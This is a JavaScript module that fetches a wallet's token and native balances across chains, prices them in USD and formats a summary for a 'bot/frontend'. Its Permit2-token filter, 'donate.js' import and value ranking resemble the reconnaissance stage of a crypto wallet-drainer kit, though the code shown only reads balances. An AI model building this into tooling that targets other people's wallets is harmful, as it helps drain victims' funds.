//src/engine/balances.js
import { ethers } from "ethers";
import { CHAINS } from "../config.js";
import { fetchNativePrice } from "./donate.js";

const BACKEND_BASE = import.meta.env.VITE_BACKEND_URL || window.location.origin;
const MORALIS_API_KEY = process.env.MORALIS_API_KEY; // set in env
const COINGECKO_API = "https://api.coingecko.com/api/v3/simple/token_price";

// --- ERC20 fetch via backend proxy (Moralis/Covalent) ---
export async function fetchBalancesCovalent(address, chainId) {
  try {
    const chain = CHAINS.find(c => c.chainId === chainId);
    if (!chain) return [];

    // ✅ Use backend proxy endpoint
    const res = await fetch(`${BACKEND_BASE}/balance/${chainId}/${address}`);
    const data = await res.json();
    const tokens = data?.data?.items || [];

    return tokens
      .filter(t => t.contract_address) // only contracts
      .map(t => {
        const decimals = Number(t.contract_decimals) || 18;
        const balanceNum = parseFloat(ethers.formatUnits(t.balance || "0", decimals)) || 0;

        // Ensure USD value is always filled
        let usdValue = 0;
        if (t.quote) {
          usdValue = Number(t.quote);
        } else if (t.quote_rate) {
          usdValue = balanceNum * Number(t.quote_rate);
        }

        return {
          tokenSymbol: t.contract_ticker_symbol,
          tokenAddress: t.contract_address.toLowerCase(),
          balanceRaw: t.balance,
          decimals,
          contract_decimals: decimals,
          quote: usdValue,
        };
      });
  } catch (err) {
    console.warn("fetchBalancesCovalent failed:", err);
    return [];
  }
}

// --- Keep ERC20s, drop only true natives (ETH, BNB) ---
export function filterPermit2SafeTokens(tokens) {
  return tokens.filter(
    t =>
      t.tokenAddress &&
      !["BNB", "ETH"].includes((t.tokenSymbol || "").toUpperCase())
  );
}

export function getChainValue(tokens) {
  return tokens.reduce((acc, t) => acc + (t.quote || 0), 0);
}

// --- Main balance aggregator ---
export async function buildWalletSummary(address) {
  const chainBalances = [];

  for (const chain of CHAINS) {
    const raw = await fetchBalancesCovalent(address, chain.chainId);
    const filtered = filterPermit2SafeTokens(raw);

    // Fetch native balance
    const rpcProvider = new ethers.JsonRpcProvider(chain.rpcUrl);
    const nativeRaw = await rpcProvider.getBalance(address);
    const nativeFormatted = parseFloat(ethers.formatEther(nativeRaw));
    const nativePrice = await fetchNativePrice(chain.nativeSymbol);
    const nativeUSD = nativeFormatted * nativePrice;

    chainBalances.push({
      chainId: chain.chainId,
      name: chain.name,
      native: nativeFormatted,
      nativeUSD,
      tokens: filtered,
      totalValue: getChainValue(filtered) + nativeUSD,
    });
  }

  // Format payload for bot/frontend
  const balancesPayload = chainBalances.map(c => ({
    name: c.name,
    native: Number(c.native).toFixed(6),
    nativeValue: Number(c.nativeUSD || 0).toFixed(2),
    tokens: c.tokens.map(t => ({
      name: t.tokenSymbol,
      amount: Number(
        ethers.formatUnits(t.balanceRaw, t.contract_decimals || t.decimals || 18)
      ).toFixed(6),
      value: Number(t.quote).toFixed(2),
    })),
    total: Number(c.totalValue).toFixed(2),
  }));

  const grandTotal = balancesPayload.reduce(
    (acc, c) => acc + parseFloat(c.total || 0),
    0
  );

  // Debug log (optional)
  console.log("buildWalletSummary result:", JSON.stringify(balancesPayload, null, 2));

  return { balancesPayload, grandTotal, chainBalances };
}
